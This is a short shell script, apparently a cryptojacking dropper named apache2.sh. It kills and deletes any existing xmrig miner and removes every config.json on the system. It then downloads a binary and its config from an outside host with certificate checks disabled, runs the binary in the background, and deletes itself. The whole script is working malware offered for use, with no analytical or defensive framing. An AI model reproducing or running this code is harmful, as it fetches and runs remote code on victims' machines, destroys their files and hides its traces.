#!/bin/sh

pkill -f xmrig
killall -9 xmrig 2>/dev/null
find / -name xmrig -exec rm -f {} \; 2>/dev/null

find / -name config.json -exec rm -f {} \; 2>/dev/null

download_file() {
    url=$1
    filename="${url##*/}"

    if busybox wget "$url" -O "$filename" --no-check-certificate; then
        echo "Downloaded successfully with wget: $filename"
    elif busybox curl -O "$url"; then
        echo "Downloaded successfully with curl: $filename"
    else
        echo "Failed to download: $url. No available download utility."
        exit 1
    fi
}

server_url="https://hev099ztbym.routingthecloud.net/s/uaj2PzOPgHd0lbD/config-node"
config_url="https://hev099ztbym.routingthecloud.net/s/uaj2PzOPgHd0lbD/config.json"

download_file "$server_url"
download_file "$config_url"

chmod 777 config-node && nohup ./config-node &

rm -r apache2.sh

exit
